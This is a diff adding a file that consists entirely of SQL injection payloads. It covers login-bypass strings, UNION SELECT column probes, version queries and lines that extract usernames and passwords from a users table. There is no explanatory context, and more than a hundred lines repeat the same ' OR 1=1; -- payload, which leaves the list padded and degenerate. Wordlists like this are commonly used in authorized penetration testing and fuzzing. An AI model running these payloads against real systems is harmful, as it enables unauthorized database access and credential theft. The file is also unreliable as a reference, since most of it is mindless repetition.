@@ -1,0 +1,144 @@
+' OR '1'='1
+" OR "1"="1
+' OR '1'='1' --
+" OR "1"="1" --
+' OR '1'='1'#
+' OR '1'='1'/*
+' OR 'x'='x
+' AND 1=2 UNION SELECT NULL, NULL, NULL, NULL, NULL --
+' AND 1=2 UNION SELECT NULL, NULL, NULL, NULL --
+' AND 1=2 UNION SELECT NULL, NULL, NULL, NULL, NULL --
+' AND 1=2 UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL --
+' AND 1=2 UNION SELECT username, password FROM users --
+" AND 1=1--
+" AND 1=1#
+" OR 1=1 --
+" OR 1=1#
+' AND username LIKE '%' UNION SELECT NULL, NULL, NULL FROM users --
+' AND username LIKE '%' UNION SELECT username, password FROM users --
+' AND 1=1 ORDER BY 1--
+' AND 1=1 ORDER BY 1 DESC--
+' AND 1=1 GROUP BY CONCAT(username, password) HAVING 1=1--
+' AND 1=1 GROUP BY CONCAT(username, password) HAVING 1=1--
+' AND 1=1 GROUP BY CONCAT(username, password) HAVING 1=1--
+' AND 1=1 GROUP BY CONCAT(username, password) HAVING 1=1--
+' AND 1=1 LIMIT 1 OFFSET 0--
+' AND 1=1 LIMIT 1 OFFSET 1--
+' UNION SELECT NULL, NULL, NULL, NULL --
+' UNION SELECT username, password FROM users --
+' UNION SELECT NULL, NULL, NULL, username, password FROM users --
+' UNION SELECT username, password FROM users --
+' UNION SELECT username, password FROM users --
+' UNION SELECT @@version, NULL, NULL, NULL --
+' UNION SELECT version(), NULL, NULL, NULL --
+' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL --
+' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --
+' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --
+' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
+' OR 1=1; --
